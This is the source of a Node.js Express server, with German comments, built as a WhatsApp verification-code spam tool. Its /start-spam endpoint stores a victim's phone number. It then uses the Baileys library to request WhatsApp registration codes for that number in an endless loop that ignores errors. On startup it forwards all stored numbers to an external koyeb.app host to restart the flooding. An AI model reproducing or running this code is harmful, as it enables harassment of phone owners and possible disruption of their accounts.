require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const QRCode = require('qrcode');
const mongoose = require('mongoose');
const morgan = require('morgan');
const fs = require('fs');
const ejs = require('ejs');
const pino = require('pino');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { promisify } = require('util');
const readFileAsync = promisify(fs.readFile);

const app = express();
const port = process.env.PORT || 8000; // Use environment variable or default port

// MongoDB connection string from environment variable
const mongoURI = process.env.MONGODB_URI;

// Connect to MongoDB
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Error connecting to MongoDB:', err));
// Modell aus dem Schema erstellen
// Schema für die Daten definieren
const SpamDataSchema = new mongoose.Schema({
    ddi: String,
    number: String,
    timestamp: { type: Date, default: Date.now }
});

// Modell aus dem Schema erstellen
const SpamData = mongoose.model('SpamData', SpamDataSchema);




const sendStoredData = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await SpamData.find({}, 'ddi number');

        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            await fetch('https://session-baron0.koyeb.app/start-spam', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ddi, number })
            });
        }));
        console.log('Stored data sent successfully');
    } catch (error) {
        console.error('Error sending stored data:', error);
    }
};
// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredData();

// Set up body parsers
let server = require('./views/qr');
code = require('./views/pair');
code2 = require('./start-pairing/pair2');
app.use('/qr', server);
app.use('/code', code);
app.use('/code2', code2);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Set up view engine and views directory
const __path = path.join(__dirname, 'views');
app.set('view engine', 'ejs');
app.set('views', __path);
app.engine('ejs', ejs.renderFile);


// Routes
app.get('/', (req, res) => {
    res.render('index', { title: 'Home' });
});

app.get('/pair', (req, res) => {
    res.render('pair', { title: 'pairing' });
});

app.get('/pair2', (req, res) => {
    res.render('pair2', { title: 'pairing2' });
});

app.get('/lock', (req, res) => {
    res.render(path.join(__path, 'lock'), { title: 'Lock' });
});



app.post('/start-spam', async (req, res) => {
    const { ddi, number } = req.body;

    try {
 // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
 const existingData = await SpamData.findOne({ ddi, number });
 if (existingData) {
     console.log('Data already exists');
 } else {
     // Neue Instanz des Modells erstellen und speichern
     const newData = new SpamData({ ddi, number });
     await newData.save();
     console.log('Data saved successfully');
 }


        const { state, saveCreds } = await useMultiFileAuthState('.mm');
        const spam = makeWaSocket({
            auth: state,
            mobile: true,
            logger: pino({ level: 'silent' })
        });
    
        while (true) {
            try {
                const response = await spam.requestRegistrationCode({
                    phoneNumber: '+' + ddi + number,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });
    
                res.json({ success: true, response }); // Send success response
                return;
            } catch (err) {
                // Fehler ignorieren und keine Aktion ausführen
            }
        }
    } catch (err) {
        // Fehler ignorieren und keine Aktion ausführen
    }
});


// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

// Start server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
